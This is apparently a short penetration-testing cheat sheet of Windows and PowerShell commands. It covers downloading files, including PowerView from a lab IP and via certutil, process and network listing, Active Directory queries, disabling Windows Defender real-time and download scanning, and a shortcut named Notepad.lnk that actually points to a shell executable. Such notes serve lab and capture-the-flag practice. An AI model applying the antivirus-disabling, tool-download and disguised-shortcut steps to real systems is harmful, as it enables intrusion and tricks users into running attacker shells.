Download Files
```Powershell
Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1

curl -o example.txt http://example.com/file.txt

certutil.exe -urlcache -split -f http://<ip>/file file_save
```

Get Processes
```powershell
Get-Process | Format-Table -Property Name, Id, CPU, WorkingSet -AutoSize

Get-Process -Name "notepad"
```

Disable AV
```powershell
# Disable Windows Defender real time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows Defender scanning for all files downloaded
Set-MpPreference -DisableIOAVProtection $true
```

List Network Connections
```powershell
netstat -aon

arp -a
```

Shortcuts
```Powershell
$targetPath = "C:\xampp\htdocs\5shell.exe"
$shortcutPath = "C:\Common Applications\Notepad.lnk"
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $targetPath
$shortcut.Save()
```

Active Directory
```
Get-ADDomain

Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota
```